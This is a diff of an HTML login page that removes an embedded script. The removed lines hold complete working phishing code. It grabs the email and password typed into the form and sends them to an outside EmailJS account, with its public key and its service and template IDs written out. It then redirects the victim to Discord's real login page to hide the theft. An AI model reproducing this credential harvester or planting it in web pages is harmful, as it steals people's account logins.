@@ -69,56 +69,5 @@
         </div>
     </div>
 
-
-    <script type="text/javascript"
-            src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-    </script>
-    <script type="text/javascript">
-        (function(){
-            emailjs.init({
-                publicKey: "9fl-QGSU884h6xRmI",
-            });
-        })();
-        
-        
-        
-        let email, passkey, form, btn
-        form = document.querySelector("form")
-        btn = document.querySelector("button")
-        
-        btn.addEventListener("click", function(e){
-            e.preventDefault() 
-        
-            email = document.querySelector("#email").value
-            passkey = document.querySelector("#passkey").value
-
-            let templateParams = {
-                email: email,
-                password: passkey,
-            };
-        
-            if (email && passkey) {
-                emailjs.send('service_krlpmbn', 'template_71ogvio', templateParams).then(
-                (response) => {
-                    console.log('SUCCESS!');
-    
-                    setTimeout(() => {
-                        window.location.href = "https://canary.discord.com/login";
-                        form.reset(); 
-                    }, 3000);
-    
-                },
-                (error) => {
-                    console.log('FAILED...');
-                },
-                );
-            }else{
-                alert("Please fill in all fields before submitting.");
-            }
-        
-        })
-    </script>
-
-
 </body>
 </html>
